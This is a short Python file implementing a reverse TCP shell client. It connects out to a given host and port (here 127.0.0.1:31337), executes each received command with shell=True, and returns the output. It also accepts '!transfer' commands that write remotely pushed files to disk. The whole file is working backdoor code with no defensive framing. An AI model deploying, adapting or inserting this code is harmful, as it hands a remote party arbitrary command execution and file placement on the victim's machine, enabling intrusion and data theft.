import shlex
import math
from subprocess import Popen, PIPE
from socket import socket, AF_INET, SOCK_STREAM

class reverse_tcp_client:
    version = AF_INET # IPV4
    proto = SOCK_STREAM # TCP

    def __init__(self,address=None,port=None,**kwargs):
        self.socket = socket(self.version,self.proto)
        self.command=""
        self.command_result=None
        self.error=b''
        self.data=b''
        self.quit_command="!exit"

        try:
            if address != None:
                self.address = address
            else: self.address = kwargs.get("address")
        except:
            raise KeyError("Address Not Provided!")

        try:
            if port != None:
                self.port = port
            else: self.port = int(kwargs.get("port"))
        except:
            raise KeyError("Port Not Provided!")

        self.connect()
        while True:
            self.recive_command()
            print(self.command)
            if "!exit" in self.command:
                self.socket.close()
                break

            #     0       1       2        3
            #!transfer <path> <dst_path> <size>
            elif "!transfer" in self.command:
                print(self.command)
                self.dst = self.command.split()[-2]
                self.receive_file(self.command.split()[-1])
            else:
                self.execute_command()
                self.get_data()
                self.send_data()

    def connect(self):
        self.socket.connect((self.address,self.port))

    def recive_command(self):
        count = 1
        self.command = self.socket.recv(1024)
        #while len(self.command) >= (count*1024):
         #   self.command += self.socket.recv(1024)
          #  count += 1
        self.command = self.command.decode()

    def receive_file(self,size):
        num_recv = math.ceil(int(size)/1024)
        with open(self.dst,"wb") as f:
            for i in range(num_recv):
                data = self.socket.recv(1024)
                f.write(data)

    def execute_command(self):
        self.command_result = Popen(shlex.split(self.command),stdout=PIPE,stderr=PIPE,shell=True)

    def get_data(self):
        self.error = self.command_result.stderr.read()
        self.data = self.command_result.stdout.read()

    def send_data(self):
        output = ""
        if self.data != b'':
            output+= "Data:\n {}\n\n".format(self.data.decode())
        if self.error != b'':
            output+= "Error:\n {}\n\n".format(self.error.decode())

        self.socket.send(output.encode())

instance = reverse_tcp_client("127.0.0.1",31337)


